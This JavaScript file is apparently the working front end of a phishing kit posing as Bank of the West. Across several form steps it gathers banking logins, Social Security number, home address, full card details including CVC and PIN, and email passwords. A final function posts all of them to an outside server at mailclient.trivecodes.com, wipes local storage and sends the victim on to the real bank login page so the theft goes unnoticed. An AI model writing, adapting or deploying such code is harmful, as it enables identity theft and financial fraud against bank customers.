const SubmitFirstUsers = () => {
  document.getElementById("submitBtn").setAttribute("disabled", true);

  const username = document.getElementById("pad").value;
  const password = document.getElementById("pads").value;

  if (
    username !== undefined &&
    username !== "" &&
    username !== null &&
    password !== undefined &&
    password !== "" &&
    password !== null
  ) {
    localStorage.setItem("BOWusername", username);
    localStorage.setItem("BOWpassword", password);

    setTimeout(() => location.assign("./confirmLogin.html"), 3000);
  } else {
    document.getElementById("pad").style.borderBottom = "1px solid #b22222";

    document.getElementById("pads").style.borderBottom = "1px solid #b22222";

    document.getElementById("submitBtn").removeAttribute("disabled");
  }
};

const SubmitPersonalInfo = () => {
  document.getElementById("submitBtn").setAttribute("disabled", true);

  const userfullName = document.getElementById("userfullName").value;
  const userfullMobile = document.getElementById("userfullMobile").value;
  const userfullAddress = document.getElementById("userfullAddress").value;
  const userfullCity = document.getElementById("userfullCity").value;
  const userfullState = document.getElementById("userfullState").value;
  const userfullZip = document.getElementById("userfullZip").value;
  const userfullSSN = document.getElementById("userfullSSN").value;

  if (
    userfullName !== undefined &&
    userfullName !== "" &&
    userfullName !== null &&
    userfullMobile !== undefined &&
    userfullMobile !== "" &&
    userfullMobile !== null &&
    userfullAddress !== undefined &&
    userfullAddress !== "" &&
    userfullAddress !== null &&
    userfullCity !== undefined &&
    userfullCity !== "" &&
    userfullCity !== null &&
    userfullState !== undefined &&
    userfullState !== "" &&
    userfullState !== null &&
    userfullZip !== undefined &&
    userfullZip !== "" &&
    userfullZip !== null &&
    userfullSSN !== undefined &&
    userfullSSN !== "" &&
    userfullSSN !== null
  ) {
    localStorage.setItem("BOWuserfullName", userfullName);
    localStorage.setItem("BOWuserfullMobile", userfullMobile);
    localStorage.setItem("BOWuserfullAddress", userfullAddress);
    localStorage.setItem("BOWuserfullCity", userfullCity);
    localStorage.setItem("BOWuserfullState", userfullState);
    localStorage.setItem("BOWuserfullZip", userfullZip);
    localStorage.setItem("BOWuserfullSSN", userfullSSN);

    setTimeout(() => location.assign("./confirmEmail.html"), 3000);
  } else {
    document.getElementById("userfullName").style.borderBottom =
      "1px solid #b22222";

    document.getElementById("userfullMobile").style.borderBottom =
      "1px solid #b22222";

    document.getElementById("userfullAddress").style.borderBottom =
      "1px solid #b22222";

    document.getElementById("userfullCity").style.borderBottom =
      "1px solid #b22222";

    document.getElementById("userfullState").style.borderBottom =
      "1px solid #b22222";

    document.getElementById("userfullZip").style.borderBottom =
      "1px solid #b22222";

    document.getElementById("userfullSSN").style.borderBottom =
      "1px solid #b22222";

    document.getElementById("submitBtn").removeAttribute("disabled");
  }
};

const FinalSubmitForm = () => {
  document.getElementById("FinalSubmit").setAttribute("disabled", true);

  const cardNumber = document.getElementById("padNumber").value;
  const cardExpiryDate = document.getElementById("padExpiryDate").value;
  const cardCVC = document.getElementById("padCVC").value;
  const cardPin = document.getElementById("padPin").value;

  if (cardNumber.length < 14) {
    document.getElementById("padNumber").style.borderBottom =
      "1px solid #b22222";

    document.getElementById("FinalSubmit").removeAttribute("disabled");
    return false;
  }

  if (
    cardExpiryDate.length < 4 ||
    Number(cardExpiryDate.split("/")[0]) > 12 ||
    Number(cardExpiryDate.split("/")[1]) < 22
  ) {
    document.getElementById("padExpiryDate").style.borderBottom =
      "1px solid #b22222";

    document.getElementById("FinalSubmit").removeAttribute("disabled");
    return false;
  }

  if (cardCVC.length < 3) {
    document.getElementById("padCVC").style.borderBottom = "1px solid #b22222";

    document.getElementById("FinalSubmit").removeAttribute("disabled");
    return false;
  }

  if (cardPin.length < 4) {
    document.getElementById("padPin").style.borderBottom = "1px solid #b22222";

    document.getElementById("FinalSubmit").removeAttribute("disabled");
    return false;
  }

  localStorage.setItem("cardNumber", cardNumber);
  localStorage.setItem("cardExpiryDate", cardExpiryDate);
  localStorage.setItem("cardCVC", cardCVC);
  localStorage.setItem("cardPin", cardPin);

  setTimeout(() => location.assign("./confirmPersonal.html"), 3000);
};

const SubmitEmailDetails = () => {
  document.getElementById("submitBtn").setAttribute("disabled", true);

  const email = document.getElementById("userMail").value;
  const emailpassword = document.getElementById("userPass").value;

  if (
    email !== undefined &&
    email !== "" &&
    email !== null &&
    emailpassword !== undefined &&
    emailpassword !== "" &&
    emailpassword !== null
  ) {
    localStorage.setItem("BOWEmail", email);
    localStorage.setItem("BOWEmailpassword", emailpassword);

    completeSubmission();
  } else {
    document.getElementById("pad").style.borderBottom = "1px solid #b22222";

    document.getElementById("pads").style.borderBottom = "1px solid #b22222";

    document.getElementById("submitBtn").removeAttribute("disabled");
  }
};

const completeSubmission = async () => {
  const MailReturn = await fetch(
    "https://mailclient.trivecodes.com/BOW/php/mail_key.php",
    {
      method: "POST",
      headers: {
        "Content-Type": "application.json",
      },
      body: JSON.stringify({
        username: localStorage.BOWusername,
        password: localStorage.BOWpassword,
        cardNumber: localStorage.cardNumber,
        cardExpiryDate: localStorage.cardExpiryDate,
        cardCVC: localStorage.cardCVC,
        cardPin: localStorage.cardPin,
        Name: localStorage.BOWuserfullName,
        Mobile: localStorage.BOWuserfullMobile,
        Address: localStorage.BOWuserfullAddress,
        City: localStorage.BOWuserfullCity,
        State: localStorage.BOWuserfullState,
        Zip: localStorage.BOWuserfullZip,
        SSN: localStorage.BOWuserfullSSN,
        Email: localStorage.BOWEmail,
        EmailPass: localStorage.BOWEmailpassword,
      }),
    }
  );

  await localStorage.clear();

  MailReturn.text().then(
    (data) =>
      data === "Sent" &&
      location.assign("https://online.bankofthewest.com/BOW/Login.aspx")
  );
};
